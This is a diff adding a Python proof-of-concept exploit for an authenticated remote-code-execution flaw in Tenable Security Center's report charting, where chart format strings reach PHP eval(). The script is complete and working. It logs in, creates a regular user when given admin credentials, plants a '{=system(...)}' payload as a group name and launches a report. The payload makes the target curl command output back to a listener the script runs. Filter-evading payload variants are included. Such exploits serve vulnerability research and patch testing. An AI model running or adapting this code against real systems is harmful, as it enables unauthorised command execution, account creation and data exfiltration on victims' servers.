@@ -1,0 +1,348 @@
+#!/usr/bin/env python3
+r"""
+CVE-2026-19626 — Tenable Security Center report-generation RCE (authenticated, non-admin).
+
+ReportChartingLib::substituteParams() evaluates `{=...}` arithmetic expressions found in
+pie-chart legend/label format strings with eval():
+
+    while ( preg_match("/{=(.*?)}/", $formatString, $exprs) ) {
+        eval("\$expr = {$exprs[1]};");                       // 6.8.0 line 8283
+        $formatString = preg_replace("/{=(.*?)}/", $expr, $formatString, 1);
+    }
+
+The format strings come from the report definition the user creates
+($style['legendFormat'] / $style['labelFormat'], 6.8.0 lines 4952/4983). Any user that
+may create report definitions (regular org users; administrators are explicitly barred
+from launching reports) can embed `{=system('<cmd>')}` — note the payload cannot contain
+a `}` (regex is non-greedy to the first brace).
+
+Command output replaces the expression in the rendered report, so the generated report
+itself is the exfil channel.
+
+Two alternate sinks in the same file, selectable with --vector:
+  labelStyling  eval("\$sectorLabels->setBackground($labelStyle);")   (lines 5538/5714;
+                payload must not contain ';' — the 6.8 guard strstr($labelStyle,";"))
+  barShape      is_callable($matches['name']) gate on bar-shape specs  (line 6125) —
+                `system(id)` style, params split on comma, so no spaces/commas in args
+
+Fixed in 6.9.0: expression charset allowlist, resolveLabelStyleArgs(), and
+isAllowedBarShapeFunction() allowlist.
+
+Usage (lab only):
+    ./poc.py --target https://sc.lab --username analyst --password 'pass' \
+             --cmd 'id' [--vector expr]
+"""
+
+import argparse
+import json
+import re
+import socket
+import sys
+import threading
+import time
+import urllib3
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+import requests
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+_gid = None
+
+
+class Callback:
+    """POST receiver for command output (target curls us back)."""
+
+    def __init__(self):
+        self.output = None
+        self.fetched = threading.Event()
+
+        class Handler(BaseHTTPRequestHandler):
+            def do_POST(h, *a):
+                n = int(h.headers.get("Content-Length", 0))
+                self.output = h.rfile.read(n).decode(errors="replace")
+                h.send_response(200)
+                h.end_headers()
+                self.fetched.set()
+
+            def do_GET(h, *a):
+                h.send_response(200)
+                h.end_headers()
+
+            def log_message(h, *a):
+                pass
+
+        self.httpd = ThreadingHTTPServer(("0.0.0.0", 0), Handler)
+        self.port = self.httpd.server_address[1]
+        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
+
+
+def local_ip_for(target_host):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.settimeout(5)
+        s.connect((target_host, 443))
+        return s.getsockname()[0]
+    finally:
+        s.close()
+
+
+class SC:
+    """Minimal Tenable SC REST client (session-token auth)."""
+
+    def __init__(self, target, verify=False):
+        if "://" not in target:
+            target = "https://" + target      # bare hostname -> https
+        self.base = target.rstrip("/")
+        self.s = requests.Session()
+        self.s.verify = verify
+        self.token = None
+
+    def login(self, username, password):
+        r = self.s.post(f"{self.base}/rest/token",
+                        json={"username": username, "password": password}, timeout=30)
+        body = r.json()
+        if body.get("error_code", 1) != 0:
+            raise SystemExit(f"[!] login failed: {body}")
+        resp = body.get("response", body)
+        if isinstance(resp, dict):                       # token nested or numeric id
+            resp = resp.get("token") or resp.get("session") or resp.get("id")
+        self.token = str(resp) if resp is not None else ""
+        if not self.token or self.token == "None":
+            raise SystemExit(f"[!] no token in login response: {body}")
+        self.s.headers["X-SecurityCenter"] = self.token
+        print(f"[+] authenticated, token {self.token[:8]}...")
+
+    def rest(self, method, path, **kw):
+        r = self.s.request(method, f"{self.base}/rest{path}", timeout=120, **kw)
+        try:
+            body = r.json()
+        except ValueError:
+            return r.status_code, {"raw": r.text}
+        return r.status_code, body
+
+    def ok(self, body, what):
+        if body.get("error_code", 0) != 0:
+            raise SystemExit(f"[!] {what} failed: {body}")
+        return body.get("response", body)
+
+
+PAYLOADS = {
+    # pie chart legend format: <*block*>...<*/*> wrapper is required by the block parser
+    "expr": lambda cmd: "<*block*>{=system('%s')}<*/*>" % cmd.replace("'", "'\\''"),
+    # labelStyling is eval'd inside setBackground(...): no semicolons allowed (6.8 guard)
+    "labelstyling": lambda cmd: "system('%s')" % cmd.replace("'", "").replace(";", ""),
+    # barShape: name(params) — params split on ','; keep single token, no spaces/quotes
+    "barshape": lambda cmd: "system(%s)" % cmd.replace(" ", "${IFS}").replace("'", ""),
+}
+
+
+def build_definition(vector, payload, name, style_family=1):
+    """PDF report definition carrying a chart component with the payload.
+
+    Schema per 6.8.0 validators (ReportDefinitions::validateAdd + ReportDefinitionLib):
+    type=pdf requires styleFamily (numeric) and non-empty definition.chapters; chart
+    components are elements with tag=component, componentType pieChart/barChart, a
+    per-component definition.dataSource (inline query is converted server-side), and
+    the style object where the injectable format strings live
+    (ReportChartingLib::generatePieChart reads $component['style']['legendFormat'] /
+    ['labelFormat'] / ['labelStyling']; generateBarChart reads ['barShape']).
+    """
+    style = {"legend": "right"}
+    component_type = "pieChart"
+    if vector == "expr":
+        # both legend and label block specs run through substituteParams() ->
+        # eval(); carrying the payload in both doubles the chance the renderer
+        # reaches one with non-null data
+        style["legendFormat"] = payload
+        style["labelFormat"] = payload
+    elif vector == "labelstyling":
+        style["labelStyling"] = payload
+    elif vector == "barshape":
+        style["barShape"] = payload
+        component_type = "barChart"
+
+    # Everything except tag/componentType lives INSIDE definition:
+    # ReportDefinitionLib passes $definition to ComponentLib::addBaseComponent
+    # (columns/labelColumns/dataPoints/dataID reads) and serializes the whole
+    # definition as xmlDefinition, which is what generatePieChart rehydrates for
+    # render ($component['style'], $component['imageWidth']).
+    #
+    # DELIVERY (lab-proven): the inline style is DISCARDED at render (components
+    # rehydrate styles from the Style tables by styleID, and the style-import
+    # route is not exposed). The payload instead rides a GROUP NAME: a non-admin
+    # creates a group named "{=system('cmd')}" (accepted verbatim), a user/sumgroup
+    # pie labels sectors with group names, and substituteParams() substitutes
+    # {label} BEFORE the {=...} eval loop — the label lands inside the format
+    # string and gets eval'd.
+    component = {
+        "tag": "component",
+        "name": name,
+        "componentType": component_type,
+        "definition": {
+            "dataSource": {
+                "type": "query",
+                # querySourceType feeds DataSource.querySourceType (NOT NULL) —
+                # 'individual' | 'cumulative' (QUERY_SOURCE_* in defines.php)
+                "querySourceType": "individual",
+                "sortColumn": "count",
+                "sortDirection": "asc",
+                # user/sumgroup: one row per group — our payload-named group
+                # becomes a sector label
+                "query": {"type": "user", "tool": "sumgroup", "filters": []},
+            },
+            # generatePieChart switches on the imploded column name — recognized
+            # values are count/total/totalCount, severity*, score, hostTotal...
+            "columns": [{"name": "count"}],
+            # sumgroup rows: DataGenerationLib maps groupID -> group NAME string
+            "labelColumns": "groupID",
+            "dataPoints": 25,
+            "imageWidth": 550,
+            "style": style,
+        },
+    }
+
+    return {
+        "name": name,
+        "description": "poc",
+        "type": "pdf",            # valid: pdf, csv, asr, arf, carf, lasr
+        "styleFamily": style_family,
+        # schedule required (error 146); 'never' = manual launch only
+        "schedule": {"type": "never"},
+        "definition": {"chapters": [{"name": "poc", "elements": [component]}]},
+    }
+
+
+def find_style_family(sc):
+    """styleFamily: render-side validation (ReportGenerateLib:131) only accepts the
+    org's style FAMILY ids — anything > 12 hard-fails PDF assembly ("Invalid Style
+    Family"), while ids <= 12 are force-fallback'd to the Plain family. Use 1 to
+    deliberately ride that fallback; discovery of a real family id is unnecessary."""
+    return 1
+
+
+def create_payload_group(sc, payload):
+    """Create a group whose NAME is the {=...} payload — non-admin-creatable,
+    braces/quotes accepted verbatim (lab-verified). The name becomes a pie sector
+    label via user/sumgroup, and substituteParams evals it after {label}."""
+    global _gid
+    _, body = sc.rest("POST", "/group", json={"name": payload, "description": "poc"})
+    if body.get("error_code", 1) != 0:
+        print(f"[!] group create failed: {body}")
+        return False
+    _gid = body["response"]["id"]
+    print(f"[+] created group carrying payload name (id {_gid})")
+    return True
+
+
+def ensure_non_admin(sc, args):
+    """Report definitions are closed to administrators (error 163) — the PoC needs a
+    regular org user. If the credentials given are admin, provision one and re-login.
+    Returns (client, style_family_id)."""
+    family = find_style_family(sc)
+    _, body = sc.rest("POST", "/reportDefinition",
+                      json=build_definition("expr", "<*block*>{=1}<*/*>", "probe-perm", family))
+    if body.get("error_code", 0) == 0:
+        # already non-admin — discard the probe definition, caller creates the real one
+        pid = body.get("response", {}).get("id")
+        if pid:
+            sc.rest("DELETE", f"/reportDefinition/{pid}")
+        return sc, family
+    if body.get("error_code") != 163:
+        return sc, family                     # different problem, let caller handle
+
+    print("[*] credentials are administrative (163) — provisioning a regular user")
+    _, rbody = sc.rest("GET", "/currentUser")
+    me = sc.ok(rbody, "get currentUser")
+    org_id = (me.get("orgID") if isinstance(me, dict) else None) or 1
+
+    _, rbody = sc.rest("GET", "/role")
+    roles = sc.ok(rbody, "list roles")
+    if isinstance(roles, dict):
+        roles = roles.get("manageable", roles.get("usable", []))
+    role_id = None
+    for r in roles:
+        if re.search(r"regular|standard", str(r.get("name", "")), re.I):
+            role_id = r.get("id")
+            print(f"[*] using role {r.get('name')} (id {role_id})")
+            break
+    if role_id is None:
+        sys.exit("[!] no Regular/Standard role found; create a non-admin user manually "
+                 f"and re-run with their credentials. Roles seen: "
+                 f"{[r.get('name') for r in roles]}")
+
+    uname, passwd = f"poc19626-{int(time.time())}", "Poc19626!pass"
+    _, rbody = sc.rest("POST", "/user", json={
+        "username": uname, "password": passwd, "roleID": role_id,
+        "orgID": org_id, "firstname": "poc", "lastname": "poc"})
+    sc.ok(rbody, f"create user {uname}")
+    print(f"[+] created non-admin user {uname} / {passwd}")
+
+    sub = SC(sc.base)
+    sub.login(uname, passwd)
+    return sub, family
+
+
+def main():
+    ap = argparse.ArgumentParser(description=__doc__,
+                                 formatter_class=argparse.RawDescriptionHelpFormatter)
+    ap.add_argument("--target", required=True, help="base URL, e.g. https://sc.lab")
+    ap.add_argument("--username", default="analyst")
+    ap.add_argument("--password", required=True)
+    ap.add_argument("--cmd", default="id", help="command to run (no '}' chars, keep short)")
+    ap.add_argument("--vector", choices=list(PAYLOADS), default="expr")
+    ap.add_argument("--timeout", type=int, default=300, help="seconds to poll for result")
+    args = ap.parse_args()
+
+    if "}" in args.cmd:
+        sys.exit("[!] payload cannot contain '}' (regex closes on first brace)")
+    for bad in ("'", '"', "$", "`"):
+        if bad in args.cmd:
+            sys.exit(f"[!] --cmd cannot contain {bad!r} (payload quoting)")
+
+    # the payload is EVAL'D AS PHP (eval("$expr = <expr>;")). Exfil: the webroot
+    # drop is DAC/SELinux-denied for jobd's process (lab-verified: "Failed to
+    # open stream: Permission denied" in eval()'d code), so the command output
+    # POSTs back to a listener in this process instead — target->kali egress is
+    # the same path the 19681 callback uses. system() is proven enabled.
+    host = args.target.split("://", 1)[-1].split("/")[0].split(":")[0]
+    ip = local_ip_for(host)
+    cb = Callback()
+    payload = ('{=system("curl -d \\"$(%s)\\" http://%s:%d")}'
+               % (args.cmd, ip, cb.port))
+    print(f"[*] callback on {ip}:{cb.port}, payload={payload!r}")
+
+    boot = SC(args.target)
+    boot.login(args.username, args.password)
+    sc, family = ensure_non_admin(boot, args)
+
+    # the delivery vehicle: a group whose name IS the payload
+    create_payload_group(sc, payload)
+
+    name = f"poc19626-{int(time.time())}"
+    _, body = sc.rest("POST", "/reportDefinition",
+                      json=build_definition(args.vector, payload, name, family))
+    rd = sc.ok(body, "create reportDefinition")
+    rd_id = rd.get("id") or rd.get("reportDefinitionID")
+    print(f"[+] reportDefinition #{rd_id} created — UI: {sc.base}/#/reports/{rd_id}")
+
+    # non-admin only: administrators are refused by ReportDefinitions::launch()
+    _, body = sc.rest("POST", f"/reportDefinition/{rd_id}/launch", json={"id": rd_id})
+    sc.ok(body, "launch report")
+    print("[+] report launched — chart render evals the group-name payload")
+
+    # wait for the callback: chart render fires within seconds of launch and
+    # the eval POSTs the command output back to us
+    print("[*] waiting for output callback ...")
+    if cb.fetched.wait(args.timeout):
+        print(f"[+] command output:\n{cb.output.rstrip()}")
+    else:
+        print(f"[!] no callback after {args.timeout}s — check /opt/sc/admin/logs/"
+              f"sc-error.log for eval()'d-code warnings to confirm the eval fired")
+    cb.httpd.shutdown()
+    if _gid:
+        sc.rest("DELETE", f"/group/{_gid}")           # drop the payload group
+
+
+if __name__ == "__main__":
+    main()
